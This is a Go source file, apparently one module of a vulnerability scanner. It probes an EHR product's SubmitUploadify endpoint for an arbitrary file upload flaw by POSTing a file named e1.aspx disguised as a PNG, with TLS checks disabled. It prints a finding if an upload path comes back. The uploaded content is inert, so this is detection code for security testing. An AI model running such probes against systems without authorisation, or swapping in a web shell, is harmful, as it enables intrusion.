package vulList

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
)

func EHRSubmitUploadifyCheck(target string) error {
	urlObj, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("URL Parse Error: %v", err)
	}

	host := urlObj.Host

	baseurl := fmt.Sprintf("%s/EHRModule/EHR_Holidays/SubmitUploadify", urlObj.Scheme+"://"+host)

	postBody := `
-----***
Content-Disposition: form-data;name="Filedata";  filename="e1.aspx"
Content-Type: image/png

123
-----***--
`
	req, err := http.NewRequest("POST", baseurl, bytes.NewBuffer([]byte(postBody)))
	if err != nil {
		return fmt.Errorf("POST Request Error: %v", err)
	}

	req.Header.Set("Host", host)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36")
	req.Header.Set("Content-Type", "multipart/form-data; boundary=---***")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 禁用证书验证
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("Request Error: %v", err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Read Response Body Error: %v", err)
	}

	responseBody := string(body)

	if strings.Contains(responseBody, `/Resource/UploadFile/AppFiles/`) {
		green := color.New(color.FgGreen)
		green.Println("[+] SubmitUploadify(EHR_Holidays) Any file upload vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-] SubmitUploadify(EHR_Holidays) Any file upload vulnerability")
		fmt.Println()
	}
	return nil

}
